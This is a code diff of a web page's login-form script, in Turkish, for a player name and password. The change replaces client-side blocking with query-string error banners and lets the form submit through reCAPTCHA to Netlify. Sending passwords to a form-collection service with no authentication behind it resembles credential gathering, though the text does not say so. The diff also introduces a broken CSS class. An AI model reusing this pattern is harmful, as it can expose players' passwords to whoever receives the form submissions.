@@ -195,7 +195,7 @@ function onSubmit(token) {
       + '<div class="bg-orange-500 rounded-t-lg"></div>'
       + '<div class="bg-red-300 border-l-4 border-red-900 p-4">'
       + '  <p class="font-bold text-red-600">Oops</p>'
-      + '  <p id="so-error-text" class="text-sm text-red-600"></p>'
+      + '  <p id="so-error-text" class="text-sm text-red-00"></p>'
       + '</div>';
     form.parentNode.insertBefore(wrap, form);
     return wrap;
@@ -222,20 +222,17 @@ function onSubmit(token) {
   }
   function validate(form){
     var ip = getInputs(form);
-    if (!ip.u || !ip.p) return true; // no fields found, don't block
+    if (!ip.u || !ip.p) return 'ok'; // no fields found
     var username = (ip.u.value || '').trim();
     var password = ip.p.value || '';
 
     if (username === '' || password === '') {
-      setBanner('Boş alan bırakmamalısın.', form);
-      return false;
+      return 'empty';
     }
     if (username.length < 3 || username.length > 16 || password.length < 6) {
-      setBanner('Girdiğin oyuncu adı veya şifre yanlış. Ama hangisi söyleyemem.', form);
-      return false;
+      return 'wrong';
     }
-    hideBanner();
-    return true;
+    return 'ok';
   }
 
   document.addEventListener('DOMContentLoaded', function(){
@@ -243,41 +240,37 @@ function onSubmit(token) {
     if (!form) return;
 
     // Prefer custom validation before any other handlers (including reCAPTCHA)
-    // 1) Intercept click on submit button
-    var submitBtn = form.querySelector('button[type="submit"], input[type="submit"], .g-recaptcha');
-    if (submitBtn) {
-      submitBtn.addEventListener('click', function(e){
-        if (!validate(form)) {
-          e.preventDefault();
-          e.stopImmediatePropagation();
-        }
-      }, true); // capture phase
-    }
-
-    // 2) Intercept Enter key submissions
-    form.addEventListener('keydown', function(e){
-      if (e.key === 'Enter' && !e.shiftKey && !e.ctrlKey) {
-        if (!validate(form)) {
-          e.preventDefault();
-          e.stopImmediatePropagation();
-        }
-      }
-    }, true);
-
-    // 3) Intercept form submit as a fallback
+    // Pre-submit blocking removed; we'll show errors after POST
+    // 3) Intercept form submit
     form.addEventListener('submit', function(e){
-      if (!validate(form)) {
-        e.preventDefault();
-        return false;
+      var result = validate(form);
+      if (result === 'empty') {
+        form.setAttribute('action', '/?e=empty');
+      } else if (result === 'wrong') {
+        form.setAttribute('action', '/?e=wrong');
+      } else {
+        form.setAttribute('action', '/');
       }
-      // VALID: for now, keep the UX simple and return to home page
-      try { e.preventDefault(); } catch(_) {}
-      window.location.href = "/";
-      return false;
+      // let default submit happen (recaptcha -> Netlify)
     }, true);
-  });
-})();
-</script>
+
+    // After load, read ?e=... and show banner accordingly
+    (function(){
+      try {
+        var p = new URLSearchParams(window.location.search);
+        var e = p.get('e');
+        if (!e) return;
+        var form = getForm();
+        if (!form) return;
+        if (e === 'empty') {
+          setBanner('Boş alan bırakmamalısın.', form);
+        } else if (e === 'wrong') {
+          setBanner('Girdiğin oyuncu adı veya şifre yanlış. Ama hangisi söylemem.', form);
+        }
+      } catch(_) {}
+    })();
+  }); // end DOMContentLoaded
+})();</script>
 <!-- END: Validation + banner additions -->
 
 </body></html>
